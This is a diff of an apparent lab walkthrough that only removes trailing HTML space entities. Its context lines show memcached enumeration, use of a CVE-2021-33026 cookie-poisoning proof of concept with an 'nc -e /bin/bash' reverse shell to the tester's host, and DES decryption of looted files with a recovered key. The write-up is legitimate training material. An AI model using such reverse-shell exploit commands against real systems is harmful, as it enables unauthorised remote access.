@@ -38,7 +38,7 @@ PORT      STATE SERVICE   VERSION
 11211/tcp open  memcached Memcached 1.4.33 (uptime 150 seconds)
 ```
 
-Interesting.&#x20;
+Interesting.
 
 ### Web + Memcache Enum
 
@@ -91,7 +91,7 @@ I googled 'memcache cookie poisoning exploit' and looked at all the results. Thi
 
 {% embed url="https://github.com/CarlosG13/CVE-2021-33026" %}
 
-It looked exactly like what I needed. So I tested it after resetting the VPN and the machine.&#x20;
+It looked exactly like what I needed. So I tested it after resetting the VPN and the machine.
 
 ```
 $ python3 cve-2021-33026_PoC.py --rhost '192.168.202.59' --rport '5000' --cmd 'nc -e /bin/bash 192.168.45.179 80' --cookie 'session:session=5cd631b0-49ba-4059-aae8-5dbae44f7c43'
@@ -183,9 +183,9 @@ dfe0444a971a789bb405c54c270ae25460f5699319aad697c7fd35ee
 f166b490169e7de5795a09305837198579daad4694e233d49b126d91
 ```
 
-I made a copy of all these files within my home directory, and began decrypting it using `openssl`. From the python script and based on the documentation for `des`, the key would be `87629ae8` and the IV is all null bytes.&#x20;
+I made a copy of all these files within my home directory, and began decrypting it using `openssl`. From the python script and based on the documentation for `des`, the key would be `87629ae8` and the IV is all null bytes.
 
-Since the key is interpreted as a bytes type object, we need to convert it to hex, which would give `3837363239616538`.&#x20;
+Since the key is interpreted as a bytes type object, we need to convert it to hex, which would give `3837363239616538`.
 
 Then, we can decrypt the files:
 
